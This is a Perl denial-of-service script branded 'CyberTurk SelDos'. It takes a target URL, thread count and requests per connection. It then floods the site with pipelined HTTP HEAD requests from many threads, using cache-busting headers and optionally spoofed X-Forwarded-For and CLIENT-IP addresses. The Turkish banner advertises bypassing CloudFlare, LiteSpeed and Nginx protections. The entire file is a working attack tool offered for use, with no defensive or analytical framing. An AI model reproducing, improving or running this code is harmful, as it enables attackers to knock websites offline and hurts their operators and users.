#!/usr/bin/perl
use Term::ANSIColor;
package control;

my $ip;


sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=99999) {$b=0;$o++;}
if($o>=99999) {$o=0;$e++;}
if($e>=99999) {$e=0;$a++;}
die("Sem Ip!\n") if($a>=99999);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;


my $ua = "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0";
my $ua = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)";
my $ua = "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)";
my $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36";
my $ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36";
my $ua = "Mozilla/5.0 (Linux; Android 7.1; Mi A1 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36";
my $ua = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36";
my $ua = "Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36";
my $ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
my $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36";
my $method = "HEAD";
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 300; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {
    my ($max,$puerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            print "\n Coder By CyberTurk - www.cyber-turks.com \n\n";
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\nSITE BAGLANILAMADI TEKRAR DENEYINIZ\n\n";
            next;
        }
        print $sock $paquete;
    }
}

sub comenzar {
    $SIG{'KILL'} = sub { print "DURDURULDU \n"; threads->exit(); };
    $url = $ARGV[0];
    print "URL: ".$url."\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "Hata..\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die(" URL HATALI !\n");
    }
    $url .= "" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    print join "","BAGLANTI SAGLANIYOR ",$max," BEKLEYINIZ \n";
    $file = " ".$file if($file !~ /^\//);
    print join "","SITE : ",$host,":",$puerto,"\n/: ",$file,"\n\n";
    if($ipfake eq "") {
        
        my $paquetebase = join "",$method," /",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
    }
    print <<EOTEXT;


    
EOTEXT

print "CyberTurk SelDos SALDIRISI BASLADI \n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "FIM!\n";
}


if($#ARGV > 2) {
    comenzar();
} else {
    print colored(['yellow on_magenta'],'
                   .-"      "-.
                  /            \
                 |   CyberTurk  |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/______________________________
 (_)@8@8{}<________|-\IIIIII/-|_C_Y_B_E_R_-_T_U_R_K_S_T_E_A_M_>
        )_/        \          /
       (@           `--------` 
	              Hosgeldiniz!
 [---]   by:>  CyberTurk   [---]
 [---]   Version:> 1.7.0 - Gelistirilecektir [---]
 [---]   Ozellikler:>LiteSpeed - Ngix - CloudFlare Bypass [---]
 [---]   700k Saldırı Ozelliği Mevcuttur. WWW.CYBER-TURKS.COM[---] ')
};
                                         
}